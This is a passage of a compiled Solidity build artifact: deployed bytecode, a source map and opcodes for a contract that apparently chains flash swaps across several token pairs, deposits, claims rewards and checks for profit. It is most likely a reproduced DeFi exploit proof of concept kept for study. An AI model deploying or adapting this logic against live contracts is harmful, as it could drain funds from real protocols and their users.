46040516370a0823160e01b815230600482015291925082916001600160a01b03909116906370a08231906024016020604051808303816000875af1158015610494573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104b891906114c6565b10156104ff5760405162461bcd60e51b81526020600482015260116024820152701b9bdd081b585ada5b99c81c1c9bda599d607a1b60448201526064015b60405180910390fd5b60025460405163a9059cbb60e01b8152336004820152602481018390526001600160a01b039091169063a9059cbb906044016020604051808303816000875af1158015610550573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061057491906114df565b5050505050505050565b6000546001600160a01b031633146105d85760405162461bcd60e51b815260206004820152601760248201527f43616c6c6572206973206e6f7420746865206f776e657200000000000000000060448201526064016104f6565b60025460055460405163095ea7b360e01b81526001600160a01b039182166004820152670de0b6b3a7640000602482015291169063095ea7b390604401600060405180830381600087803b15801561062f57600080fd5b505af1158015610643573d6000803e3d6000fd5b5050600554600254600654604051631c4009f960e01b81526001600160a01b039283166004820152670de0b6b3a76400006024820152908216604482015291169250631c4009f99150606401600060405180830381600087803b1580156106a957600080fd5b505af11580156106bd573d6000803e3d6000fd5b50506006546040516370a0823160e01b8152306004820152600093506001600160a01b0390911691506370a0823190602401602060405180830381865afa15801561070c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061073091906114c6565b60065460075460405163095ea7b360e01b81526001600160a01b03918216600482015260248101849052929350169063095ea7b3906044016020604051808303816000875af1158015610787573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107ab91906114df565b5060075460405163b6b55f2560e01b8152600481018390526001600160a01b039091169063b6b55f2590602401600060405180830381600087803b1580156107f257600080fd5b505af1158015610806573d6000803e3d6000fd5b5050505050565b6000806008810160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610865573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108899190611376565b506008546040805163d21220a760e01b815290516001600160701b0394851696509290931693506001600160a01b03169163d21220a79160048083019260209291908290030181865afa1580156108e4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061090891906113c6565b6002546001600160a01b039182169116036109b9576008546001600160a01b031663022c0d9f600061093b6001856113ea565b604080516000602082015260019181019190915230906060015b6040516020818303038152906040526040518563ffffffff1660e01b8152600401610983949392919061144e565b600060405180830381600087803b15801561099d57600080fd5b505af11580156109b1573d6000803e3d6000fd5b505050505050565b6008546001600160a01b031663022c0d9f6109d56001856113ea565b604080516000602082018190529181018290523090606001610955565b6109fa610aef565b600354600f546040805163f77c479160e01b815290516001600160a01b039384169363a9059cbb93169163f77c479191600480830192602092919082900301816000875af1158015610a50573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a7491906113c6565b6040516001600160e01b031960e084901b1681526001600160a01b0390911660048201526a0273ad42557ccc5c6686ca60248201526044016020604051808303816000875af1158015610acb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109b191906114df565b6002546040516370a0823160e01b815230600482015260009169032d26d12e980b600000916001600160a01b03909116906370a08231906024016020604051808303816000875af1158015610b48573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b6c91906114c6565b610b7691906113ea565b60025460055460405163095ea7b360e01b81526001600160a01b0391821660048201526000196024820152929350169063095ea7b390604401600060405180830381600087803b158015610bc957600080fd5b505af1158015610bdd573d6000803e3d6000fd5b5050600554600254600654604051631c4009f960e01b81526001600160a01b03928316600482015269032d26d12e980b6000006024820152908216604482015291169250631c4009f99150606401600060405180830381600087803b158015610c4557600080fd5b505af1158015610c59573d6000803e3d6000fd5b50506006546040516370a0823160e01b81523060048201526001600160a01b03909116925063a9059cbb9150829081906370a0823190602401602060405180830381865afa158015610caf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610cd391906114c6565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610d1e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d4291906114df565b50600080601060009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610d99573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610dbd9190611376565b50601254604051630153543560e21b8152600481018790526001600160701b03928316602482018190529390921660448301819052945091925084916000916001600160a01b039091169063054d50d490606401602060405180830381865afa158015610e2e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e5291906114c6565b60025460105460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101869052929350169063a9059cbb906044016020604051808303816000875af1158015610ea9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ecd91906114df565b5060105460405163022c0d9f60e01b8152600481018390526000602482018190523060448301526080606483015260848201526001600160a01b039091169063022c0d9f9060a401600060405180830381600087803b158015610f2f57600080fd5b505af1158015610f43573d6000803e3d6000fd5b50505050600760009054906101000a90046001600160a01b03166001600160a01b0316633d18b9126040518163ffffffff1660e01b8152600401600060405180830381600087803b158015610f9757600080fd5b505af1158015610fab573d6000803e3d6000fd5b5050600480546040516370a0823160e01b8152309281019290925260009350600192506001600160a01b0316906370a08231906024016020604051808303816000875af1158015611000573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061102491906114c6565b61102e91906113ea565b9050600080601160009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015611086573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110aa9190611376565b50601254604051630153543560e21b8152600481018790526001600160701b03928316602482018190529390921660448301819052945091925084916000916001600160a01b039091169063054d50d490606401602060405180830381865afa15801561111b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061113f91906114c6565b6004805460115460405163a9059cbb60e01b81526001600160a01b039182169381019390935260248301869052929350919091169063a9059cbb906044016020604051808303816000875af115801561119c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111c091906114df565b5060115460405163022c0d9f60e01b8152600481018390526000602482018190523060448301526080606483015260848201526001600160a01b039091169063022c0d9f9060a401600060405180830381600087803b15801561122257600080fd5b505af1158015611236573d6000803e3d6000fd5b5050505050505050505050505050565b6001600160a01b038116811461125b57600080fd5b50565b60008060008060006080868803121561127657600080fd5b853561128181611246565b94506020860135935060408601359250606086013567ffffffffffffffff808211156112ac57600080fd5b818801915088601f8301126112c057600080fd5b8135818111156112cf57600080fd5b8960208285010111156112e157600080fd5b9699959850939650602001949392505050565b6000806040838503121561130757600080fd5b50508035926020909101359150565b634e487b7160e01b600052601160045260246000fd5b6000821982111561133f5761133f611316565b500190565b634e487b7160e01b600052603260045260246000fd5b80516001600160701b038116811461137157600080fd5b919050565b60008060006060848603121561138b57600080fd5b6113948461135a565b92506113a26020850161135a565b9150604084015163ffffffff811681146113bb57600080fd5b809150509250925092565b6000602082840312156113d857600080fd5b81516113e381611246565b9392505050565b6000828210156113fc576113fc611316565b500390565b6000815180845260005b818110156114275760208185018101518683018201520161140b565b81811115611439576000602083870101525b50601f01601f19169290920160200192915050565b84815283602082015260018060a01b038316604082015260806060820152600061147b6080830184611401565b9695505050505050565b600081600019048311821515161561149f5761149f611316565b500290565b6000826114c157634e487b7160e01b600052601260045260246000fd5b500490565b6000602082840312156114d857600080fd5b5051919050565b6000602082840312156114f157600080fd5b815180151581146113e357600080fdfea26469706673582212206f25289f5cef75c845902483302c8a5ffd31a7f717a6bb0cefc707a992bb48ce64736f6c634300080f0033",
  "deployedSourceMap": "85:5339:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2811:1144;;;;;;:::i;:::-;;:::i;:::-;;1860:373;;;:::i;2239:566::-;;;:::i;3965:230::-;;;;;;:::i;:::-;;:::i;2811:1144::-;2929:10;2943:31;;;;2954:5;2943:31;:::i;:::-;2926:48;;;2992:1;2984:4;;:9;;;;;;;:::i;:::-;;;;-1:-1:-1;;3006:4:0;;3013:1;-1:-1:-1;3003:668:0;;;3030:12;3044;3075:14;3090:4;;3075:20;;;;;;;:::i;:::-;;;;;;;;;;-1:-1:-1;;;;;3075:20:0;-1:-1:-1;;;;;3062:46:0;;:48;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3029:81;-1:-1:-1;;;;;3029:81:0;;;-1:-1:-1;;;;;3029:81:0;;;3158:14;3173:4;;3158:20;;;;;;;:::i;:::-;;;;;;;;;;-1:-1:-1;;;;;3158:20:0;-1:-1:-1;;;;;3145:41:0;;:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3136:4;;-1:-1:-1;;;;;3128:60:0;;;3136:4;;3128:60;3124:371;;3249:14;3264:4;;3249:20;;;;;;;:::i;:::-;;;-1:-1:-1;;;;;3249:20:0;3236:39;3249:20;3279:11;3249:20;3279:7;:11;:::i;:::-;3307:16;;;3318:1;3307:16;;;2888:36:2;3321:1:0;2940:18:2;;;2933:45;3307:16:0;;;;;;;;;2861:18:2;;;3307:16:0;;;;-1:-1:-1;;;;;;3236:88:0;;;;;;;;;;;;3300:4;;3236:88;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3124:371;;;3405:14;3420:4;;3405:20;;;;;;;:::i;:::-;;;-1:-1:-1;;;;;3405:20:0;3392:39;3432:11;3405:20;3432:7;:11;:::i;:::-;3463:16;;;3445:1;3463:16;;;2888:36:2;;;2940:18;;;2933:45;;;3456:4:0;;2861:18:2;;3463:16:0;;;;;;;;;;;;3392:88;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3124:371;3015:490;;3003:668;;;3573:11;;3618:7;;3573:87;;-1:-1:-1;;;3573:87:0;;3603:4;3573:87;;;5031:34:2;-1:-1:-1;;;;;3618:7:0;;;5081:18:2;;;5074:43;3628:25:0;5133:18:2;;;5126:34;5196:3;5176:18;;;5169:31;5237:1;5216:19;;;5209:30;-1:-1:-1;;;5255:19:2;;;5248:33;3573:11:0;;;:21;;5298:19:2;;3573:87:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3003:668;3716:17;3736:10;;:84;;3811:4;3788:19;:11;3802:5;3788:19;:::i;:::-;3787:28;;;;:::i;:::-;:32;;3818:1;3787:32;:::i;:::-;3736:84;;;3774:4;3751:19;:11;3765:5;3751:19;:::i;:::-;3750:28;;;;:::i;:::-;:32;;3781:1;3750:32;:::i;:::-;3838:4;;:29;;-1:-1:-1;;;3838:29:0;;3861:4;3838:29;;;5869:51:2;3716:104:0;;-1:-1:-1;3716:104:0;;-1:-1:-1;;;;;3838:4:0;;;;:14;;5842:18:2;;3838:29:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:42;;3830:72;;;;-1:-1:-1;;;3830:72:0;;6322:2:2;3830:72:0;;;6304:21:2;6361:2;6341:18;;;6334:30;-1:-1:-1;;;6380:18:2;;;6373:47;6437:18;;3830:72:0;;;;;;;;;3912:4;;:36;;-1:-1:-1;;;3912:36:0;;3926:10;3912:36;;;6640:51:2;6707:18;;;6700:34;;;-1:-1:-1;;;;;3912:4:0;;;;:13;;6613:18:2;;3912:36:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;2916:1039;;2811:1144;;;;;:::o;1860:373::-;1772:5;;-1:-1:-1;;;;;1772:5:0;1758:10;:19;1750:55;;;;-1:-1:-1;;;1750:55:0;;7229:2:2;1750:55:0;;;7211:21:2;7268:2;7248:18;;;7241:30;7307:25;7287:18;;;7280:53;7350:18;;1750:55:0;7027:347:2;1750:55:0;1904:4:::1;::::0;1925:6:::1;::::0;1904:35:::1;::::0;-1:-1:-1;;;1904:35:0;;-1:-1:-1;;;;;1925:6:0;;::::1;1904:35;::::0;::::1;6640:51:2::0;1934:4:0::1;6707:18:2::0;;;6700:34;1904:4:0;::::1;::::0;:12:::1;::::0;6613:18:2;;1904:35:0::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;-1:-1:-1::0;;1949:6:0::1;::::0;1975:4:::1;::::0;1996:15:::1;::::0;1949:64:::1;::::0;-1:-1:-1;;;1949:64:0;;-1:-1:-1;;;;;1975:4:0;;::::1;1949:64;::::0;::::1;7950:34:2::0;1982:4:0::1;8000:18:2::0;;;7993:34;1996:15:0;;::::1;8043:18:2::0;;;8036:43;1949:6:0;::::1;::::0;-1:-1:-1;1949:17:0::1;::::0;-1:-1:-1;7885:18:2;;1949:64:0::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;-1:-1:-1::0;;2044:15:0::1;::::0;:40:::1;::::0;-1:-1:-1;;;2044:40:0;;2078:4:::1;2044:40;::::0;::::1;5869:51:2::0;2024:17:0::1;::::0;-1:-1:-1;;;;;;2044:15:0;;::::1;::::0;-1:-1:-1;2044:25:0::1;::::0;5842:18:2;;2044:40:0::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2094:15;::::0;2126:26:::1;::::0;2094:74:::1;::::0;-1:-1:-1;;;2094:74:0;;-1:-1:-1;;;;;2126:26:0;;::::1;2094:74;::::0;::::1;6640:51:2::0;6707:18;;;6700:34;;;2024:60:0;;-1:-1:-1;2094:15:0::1;::::0;:23:::1;::::0;6613:18:2;;2094:74:0::1;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1::0;2178:26:0::1;::::0;:48:::1;::::0;-1:-1:-1;;;2178:48:0;;::::1;::::0;::::1;8236:25:2::0;;;-1:-1:-1;;;;;2178:26:0;;::::1;::::0;:34:::1;::::0;8209:18:2;;2178:48:0::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1894:339;1860:373::o:0;2239:566::-;2275:12;;2320:14;2275:12;2320:17;;;;;;;;;-1:-1:-1;;;;;2320:17:0;-1:-1:-1;;;;;2307:43:0;;:45;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;2396:14:0;:17;2383:40;;;-1:-1:-1;;;2383:40:0;;;;-1:-1:-1;;;;;2274:78:0;;;;-1:-1:-1;2274:78:0;;;;;-1:-1:-1;;;;;;2396:17:0;;2383:38;;:40;;;;;;;;;;;;;;2396:17;2383:40;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2374:4;;-1:-1:-1;;;;;2366:57:0;;;2374:4;;2366:57;2362:289;;2452:14;:17;-1:-1:-1;;;;;2452:17:0;2439:36;2467:1;2479:11;2452:17;2479:7;:11;:::i;:::-;2507:16;;;2518:1;2507:16;;;2888:36:2;2521:1:0;2940:18:2;;;2933:45;;;;2500:4:0;;2861:18:2;;2507:16:0;;;;;;;;;;;;;2439:85;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2264:541;;2239:566::o;2362:289::-;2568:14;:17;-1:-1:-1;;;;;2568:17:0;2555:36;2592:11;2568:17;2592:7;:11;:::i;:::-;2623:16;;;2605:1;2623:16;;;2888:36:2;;;2940:18;;;2933:45;;;2616:4:0;;2861:18:2;;2623:16:0;2702:282:2;3965:230:0;4075:8;:6;:8::i;:::-;4094:7;;4111:11;;:24;;;-1:-1:-1;;;4111:24:0;;;;-1:-1:-1;;;;;4094:7:0;;;;:16;;4111:11;;:22;;:24;;;;;;;;;;;;;;4094:7;4111:11;:24;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;4094:94;;-1:-1:-1;;;;;;4094:94:0;;;;;;;-1:-1:-1;;;;;6658:32:2;;;4094:94:0;;;6640:51:2;4137:50:0;6707:18:2;;;6700:34;6613:18;;4094:94:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;4202:1220::-;4257:4;;:29;;-1:-1:-1;;;4257:29:0;;4280:4;4257:29;;;5869:51:2;4238:16:0;;4289:8;;-1:-1:-1;;;;;4257:4:0;;;;:14;;5842:18:2;;4257:29:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:40;;;;:::i;:::-;4340:4;;4361:6;;4340:48;;-1:-1:-1;;;4340:48:0;;-1:-1:-1;;;;;4361:6:0;;;4340:48;;;6640:51:2;-1:-1:-1;;6707:18:2;;;6700:34;4238:59:0;;-1:-1:-1;4340:4:0;;:12;;6613:18:2;;4340:48:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;4398:6:0;;4424:4;;4449:15;;4398:68;;-1:-1:-1;;;4398:68:0;;-1:-1:-1;;;;;4424:4:0;;;4398:68;;;7950:34:2;4431:8:0;8000:18:2;;;7993:34;4449:15:0;;;8043:18:2;;;8036:43;4398:6:0;;;-1:-1:-1;4398:17:0;;-1:-1:-1;7885:18:2;;4398:68:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;4476:15:0;;4527:40;;-1:-1:-1;;;4527:40:0;;4561:4;4527:40;;;5869:51:2;-1:-1:-1;;;;;4476:15:0;;;;-1:-1:-1;4476:24:0;;-1:-1:-1;4476:15:0;;;;4527:25;;5842:18:2;;4527:40:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;4476:92;;-1:-1:-1;;;;;;4476:92:0;;;;;;;-1:-1:-1;;;;;6658:32:2;;;4476:92:0;;;6640:51:2;6707:18;;;6700:34;6613:18;;4476:92:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;4636:13;4651;4683:29;;;;;;;;;-1:-1:-1;;;;;4683:29:0;-1:-1:-1;;;;;4670:55:0;;:57;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;4802:6:0;;:50;;-1:-1:-1;;;4802:50:0;;;;;9195:25:2;;;-1:-1:-1;;;;;4635:92:0;;;9236:18:2;;;9229:34;;;4635:92:0;;;;9279:18:2;;;9272:34;;;4635:92:0;-1:-1:-1;4635:92:0;;-1:-1:-1;4763:11:0;;4746:14;;-1:-1:-1;;;;;4802:6:0;;;;:19;;9168:18:2;;4802:50:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;4862:4;;4884:29;;4862:64;;-1:-1:-1;;;4862:64:0;;-1:-1:-1;;;;;4884:29:0;;;4862:64;;;6640:51:2;6707:18;;;6700:34;;;4784:68:0;;-1:-1:-1;4862:4:0;;:13;;6613:18:2;;4862:64:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;4936:29:0;;:68;;-1:-1:-1;;;4936:68:0;;;;;9592:25:2;;;4936:29:0;9633:18:2;;;9626:34;;;4994:4:0;9676:18:2;;;9669:60;9765:3;9745:18;;;9738:31;9785:19;;;9778:30;-1:-1:-1;;;;;4936:29:0;;;;:34;;9825:19:2;;4936:68:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5015:26;;;;;;;;;-1:-1:-1;;;;;5015:26:0;-1:-1:-1;;;;;5015:36:0;;:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;5084:5:0;;;:30;;-1:-1:-1;;;5084:30:0;;5108:4;5084:30;;;5869:51:2;;;;5064:17:0;;-1:-1:-1;5117:1:0;;-1:-1:-1;;;;;;5084:5:0;;:15;;5842:18:2;;5084:30:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:34;;;;:::i;:::-;5064:54;;5129:12;5143;5161:10;;;;;;;;;-1:-1:-1;;;;;5161:10:0;-1:-1:-1;;;;;5161:22:0;;:24;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;5250:6:0;;:51;;-1:-1:-1;;;5250:51:0;;;;;9195:25:2;;;-1:-1:-1;;;;;5128:57:0;;;9236:18:2;;;9229:34;;;5128:57:0;;;;9279:18:2;;;9272:34;;;5128:57:0;-1:-1:-1;5128:57:0;;-1:-1:-1;5211:12:0;;5195:13;;-1:-1:-1;;;;;5250:6:0;;;;:19;;9168:18:2;;5250:51:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;5312:5;;;5335:10;;5312:45;;-1:-1:-1;;;5312:45:0;;-1:-1:-1;;;;;5335:10:0;;;5312:45;;;6640:51:2;;;;6707:18;;;6700:34;;;5233:68:0;;-1:-1:-1;5312:5:0;;;;;:14;;6613:18:2;;5312:45:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;5367:10:0;;:48;;-1:-1:-1;;;5367:48:0;;;;;9592:25:2;;;5367:10:0;9633:18:2;;;9626:34;;;5405:4:0;9676:18:2;;;9669:60;9765:3;9745:18;;;9738:31;9785:19;;;9778:30;-1:-1:-1;;;;;5367:10:0;;;;:15;;9825:19:2;;5367:48:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4228:1194;;;;;;;;;;4202:1220::o;14:131:2:-;-1:-1:-1;;;;;89:31:2;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:863::-;247:6;255;263;271;279;332:3;320:9;311:7;307:23;303:33;300:53;;;349:1;346;339:12;300:53;388:9;375:23;407:31;432:5;407:31;:::i;:::-;457:5;-1:-1:-1;509:2:2;494:18;;481:32;;-1:-1:-1;560:2:2;545:18;;532:32;;-1:-1:-1;615:2:2;600:18;;587:32;638:18;668:14;;;665:34;;;695:1;692;685:12;665:34;733:6;722:9;718:22;708:32;;778:7;771:4;767:2;763:13;759:27;749:55;;800:1;797;790:12;749:55;840:2;827:16;866:2;858:6;855:14;852:34;;;882:1;879;872:12;852:34;927:7;922:2;913:6;909:2;905:15;901:24;898:37;895:57;;;948:1;945;938:12;895:57;150:863;;;;-1:-1:-1;150:863:2;;-1:-1:-1;979:2:2;971:11;;1001:6;150:863;-1:-1:-1;;;150:863:2:o;1018:248::-;1086:6;1094;1147:2;1135:9;1126:7;1122:23;1118:32;1115:52;;;1163:1;1160;1153:12;1115:52;-1:-1:-1;;1186:23:2;;;1256:2;1241:18;;;1228:32;;-1:-1:-1;1018:248:2:o;1271:127::-;1332:10;1327:3;1323:20;1320:1;1313:31;1363:4;1360:1;1353:15;1387:4;1384:1;1377:15;1403:128;1443:3;1474:1;1470:6;1467:1;1464:13;1461:39;;;1480:18;;:::i;:::-;-1:-1:-1;1516:9:2;;1403:128::o;1536:127::-;1597:10;1592:3;1588:20;1585:1;1578:31;1628:4;1625:1;1618:15;1652:4;1649:1;1642:15;1668:188;1747:13;;-1:-1:-1;;;;;1789:42:2;;1779:53;;1769:81;;1846:1;1843;1836:12;1769:81;1668:188;;;:::o;1861:450::-;1948:6;1956;1964;2017:2;2005:9;1996:7;1992:23;1988:32;1985:52;;;2033:1;2030;2023:12;1985:52;2056:40;2086:9;2056:40;:::i;:::-;2046:50;;2115:49;2160:2;2149:9;2145:18;2115:49;:::i;:::-;2105:59;;2207:2;2196:9;2192:18;2186:25;2251:10;2244:5;2240:22;2233:5;2230:33;2220:61;;2277:1;2274;2267:12;2220:61;2300:5;2290:15;;;1861:450;;;;;:::o;2316:251::-;2386:6;2439:2;2427:9;2418:7;2414:23;2410:32;2407:52;;;2455:1;2452;2445:12;2407:52;2487:9;2481:16;2506:31;2531:5;2506:31;:::i;:::-;2556:5;2316:251;-1:-1:-1;;;2316:251:2:o;2572:125::-;2612:4;2640:1;2637;2634:8;2631:34;;;2645:18;;:::i;:::-;-1:-1:-1;2682:9:2;;2572:125::o;2989:471::-;3030:3;3068:5;3062:12;3095:6;3090:3;3083:19;3120:1;3130:162;3144:6;3141:1;3138:13;3130:162;;;3206:4;3262:13;;;3258:22;;3252:29;3234:11;;;3230:20;;3223:59;3159:12;3130:162;;;3310:6;3307:1;3304:13;3301:87;;;3376:1;3369:4;3360:6;3355:3;3351:16;3347:27;3340:38;3301:87;-1:-1:-1;3442:2:2;3421:15;-1:-1:-1;;3417:29:2;3408:39;;;;3449:4;3404:50;;2989:471;-1:-1:-1;;2989:471:2:o;3465:466::-;3704:6;3693:9;3686:25;3747:6;3742:2;3731:9;3727:18;3720:34;3819:1;3815;3810:3;3806:11;3802:19;3794:6;3790:32;3785:2;3774:9;3770:18;3763:60;3859:3;3854:2;3843:9;3839:18;3832:31;3667:4;3880:45;3920:3;3909:9;3905:19;3897:6;3880:45;:::i;:::-;3872:53;3465:466;-1:-1:-1;;;;;;3465:466:2:o;5328:168::-;5368:7;5434:1;5430;5426:6;5422:14;5419:1;5416:21;5411:1;5404:9;5397:17;5393:45;5390:71;;;5441:18;;:::i;:::-;-1:-1:-1;5481:9:2;;5328:168::o;5501:217::-;5541:1;5567;5557:132;;5611:10;5606:3;5602:20;5599:1;5592:31;5646:4;5643:1;5636:15;5674:4;5671:1;5664:15;5557:132;-1:-1:-1;5703:9:2;;5501:217::o;5931:184::-;6001:6;6054:2;6042:9;6033:7;6029:23;6025:32;6022:52;;;6070:1;6067;6060:12;6022:52;-1:-1:-1;6093:16:2;;5931:184;-1:-1:-1;5931:184:2:o;6745:277::-;6812:6;6865:2;6853:9;6844:7;6840:23;6836:32;6833:52;;;6881:1;6878;6871:12;6833:52;6913:9;6907:16;6966:5;6959:13;6952:21;6945:5;6942:32;6932:60;;6988:1;6985;6978:12",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    85,
    5424
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x84800812 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0xDFFEADD0 EQ PUSH2 0x6E JUMPI DUP1 PUSH4 0xEE872558 EQ PUSH2 0x76 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0x5F CALLDATASIZE PUSH1 0x4 PUSH2 0x125E JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x64 PUSH2 0x57E JUMP JUMPDEST PUSH2 0x64 PUSH2 0x80D JUMP JUMPDEST PUSH2 0x64 PUSH2 0x84 CALLDATASIZE PUSH1 0x4 PUSH2 0x125E JUMP JUMPDEST PUSH2 0x9F2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x97 DUP3 DUP5 ADD DUP5 PUSH2 0x12F4 JUMP JUMPDEST SWAP2 POP POP PUSH1 0x1 DUP1 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0xAC SWAP2 SWAP1 PUSH2 0x132C JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 SLOAD PUSH1 0x7 GT ISZERO PUSH2 0x35E JUMPI PUSH1 0x0 DUP1 PUSH1 0x8 PUSH1 0x1 SLOAD PUSH1 0x7 DUP2 LT PUSH2 0xD4 JUMPI PUSH2 0xD4 PUSH2 0x1344 JUMP JUMPDEST ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x902F1AC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x1376 JUMP JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 POP PUSH1 0x8 PUSH1 0x1 SLOAD PUSH1 0x7 DUP2 LT PUSH2 0x176 JUMPI PUSH2 0x176 PUSH2 0x1344 JUMP JUMPDEST ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV 